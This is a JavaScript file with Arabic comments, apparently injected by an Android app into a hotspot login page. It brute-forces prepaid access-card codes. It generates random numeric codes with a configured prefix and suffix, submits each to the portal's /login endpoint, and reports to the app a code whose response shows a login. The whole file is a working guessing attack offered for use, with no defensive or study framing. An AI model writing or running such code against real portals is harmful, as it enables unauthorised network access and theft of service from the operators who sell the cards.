(function() {
    if (window.__cracking) {
        try { window.AndroidBridge.log("التخمين يعمل بالفعل"); } catch(e) {}
        return;
    }
    window.__cracking = true;
    const CFG = window.FINDER_CONFIG;
    if (!CFG) { window.__cracking = false; return; }
    
    let stopped = false;
    window.stopFinder = function() { stopped = true; window.__cracking = false; };

    function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }

    async function run() {
        log('▶ بدء التخمين المرئي (داخل صفحة الدخول)');
        const input = document.querySelector('input[name="username"]');
        const errorDiv = document.getElementById('error');
        
        if (!input) {
            log('❌ لم يجد حقل الإدخال. تأكد من فتح صفحة الدخول.');
            window.__cracking = false;
            return;
        }

        const maxVal = Math.pow(10, CFG.digits) - 1;
        let done = 0;

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ تم الإيقاف'); break; }

            const num = Math.floor(Math.random() * (maxVal + 1));
            const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;

            // 1. تحديث الحقل بصرياً (سترى الرقم يكتب في الشاشة)
            input.value = v;
            input.dispatchEvent(new Event('input', {bubbles:true}));
            input.dispatchEvent(new Event('change', {bubbles:true}));

            // 2. تحديث السجل والتقدم
            done++;
            try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e) {}
            log('🔍 ' + v);

            // 3. إرسال الطلب في الخلفية (بدون إعادة تحميل الصفحة)
            try {
                const base = new URL(CFG.url).origin;
                const loginUrl = base + "/login?username=" + encodeURIComponent(v) + "&password=";
                const res = await fetch(loginUrl, { credentials: 'include' });
                const text = await res.text();

                // 4. فحص النتيجة
                if (text.includes("logged_in") || text.includes("status")) {
                    log('✅✅✅ وجد الكرت: ' + v);
                    if (errorDiv) { errorDiv.innerText = "✅ الكرت صحيح: " + v; errorDiv.style.color = "green"; }
                    try { window.AndroidBridge.found(v, text); } catch(e) {}
                    window.__cracking = false;
                    return;
                }
                
                // 5. عرض الخطأ في الصفحة (سترى الخطأ الأحمر)
                if (errorDiv) {
                    errorDiv.innerText = "الكرت " + v + " غير صحيح";
                    errorDiv.style.color = "red";
                    errorDiv.style.fontWeight = "bold";
                }
            } catch(e) {
                log('⚠ خطأ شبكة: ' + e.message);
            }

            // 6. تأخير بسيط
            await new Promise(r => setTimeout(r, CFG.pause));
        }
        log('❌ انتهى التخمين المرئي');
        window.__cracking = false;
    }

    setTimeout(run, 300);
})();
